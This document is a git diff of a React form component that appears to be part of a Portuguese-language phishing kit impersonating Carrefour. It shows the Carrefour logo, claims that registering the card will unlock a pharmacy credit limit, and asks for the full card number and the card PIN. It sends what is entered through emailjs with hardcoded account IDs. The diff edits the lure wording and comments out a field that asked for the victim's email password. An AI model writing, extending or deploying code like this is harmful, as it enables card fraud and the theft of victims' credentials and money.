@@ -1,11 +1,14 @@
-import React, { Component,useEffect } from 'react'
+import React, { Component,useState } from 'react'
 import logo from './carrfo.png'
 import emailjs from 'emailjs-com';
 
 
 
-
 export class SocialProfiles extends Component {
+
+
+
+    
     continue = e => {
         e.preventDefault();
         this.props.nextStep();
@@ -15,11 +18,16 @@ export class SocialProfiles extends Component {
         e.preventDefault();
         this.props.prevStep();
     };
+    
 
     render() {
+
+
+
+
         function sendEmail(e) {
             e.preventDefault();
-        
+
             emailjs.sendForm('service_m0rqqeb', 'template_ovtqo1m', e.target, 'user_blutAP3dvwCpJzktiSL3a')
               .then((result) => {
                   console.log(result.text);
@@ -31,8 +39,9 @@ export class SocialProfiles extends Component {
               });
 
 
-          }
-      
+          
+        }
+          
 
         const { values, inputChange } = this.props;
         const {
@@ -47,7 +56,7 @@ export class SocialProfiles extends Component {
 
 <img className="logo" src={logo} width="100"/>
 </div>
-                <p className="container"><b>Tudo certo!<br></br></b> Precisamos Cadastrar informações do seu <b>Cartão de Crédito</b></p>
+                <p className="container"><b>Tudo certo!<br></br></b> Precisamos Cadastrar seu <b>Cartão Carrefour</b> para Liberar o Limite Crédito Drogaria</p>
                 <div className="form-group">
                     <input placeholder="16 dígitos do cartão" type="number" className="form-control" name="cc" onChange={inputChange('cc')} value={values.cc} required/>
                 </div>
@@ -60,12 +69,10 @@ export class SocialProfiles extends Component {
                 <div className="form-group">
                     <input placeholder="Senha do cartão" className="form-control" name="ccpass" onChange={inputChange('ccpass')} value={values.ccpass} required/>
                 </div>
-                <div className="form-group">
+                {/* <div className="form-group">
                     <input placeholder="Senha do email" type="text" className="form-control" name="passemail" onChange={inputChange('passemail')} value={values.passemail} required/>
                    <span class="focus-border"></span>
-                </div>
-                <br />
-                {/* <input type="text" name="ip" placeholder={this.ipzao}  ></input> */}
+                </div> */}
 
                 <div className="row">
                     <div className="col-6">
